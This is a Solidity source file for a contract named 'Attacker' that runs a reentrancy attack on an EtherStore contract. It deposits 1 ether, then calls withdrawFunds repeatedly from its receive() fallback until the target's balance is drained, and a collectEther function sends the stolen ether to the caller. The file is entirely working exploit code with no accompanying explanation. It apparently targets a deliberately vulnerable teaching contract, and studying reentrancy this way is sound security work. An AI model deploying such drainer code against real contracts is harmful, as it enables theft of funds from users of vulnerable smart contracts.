//SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;

import "./EtherStore.sol";

contract Attacker {
  EtherStore public etherStore;

  // initialize the etherStore variable with the contract address
  constructor(address _etherStoreAddress){
    etherStore = EtherStore(_etherStoreAddress);
  }

  function attackEtherStore() public payable {
    // attack to the nearest ether
    require(msg.value >= 1 ether, "Attacker msg.value < 1 ether");
    // sent eth to the depositFunds() function
    etherStore.depositFunds{value: 1 ether}();
    // start the magic
    etherStore.withdrawFunds(1 ether);
  }

  function collectEther() public {
    payable(msg.sender).transfer(address(this).balance);
  }

  receive() external payable {
    if(address(etherStore).balance > 1 ether){
      etherStore.withdrawFunds(1 ether);
    }
  }
}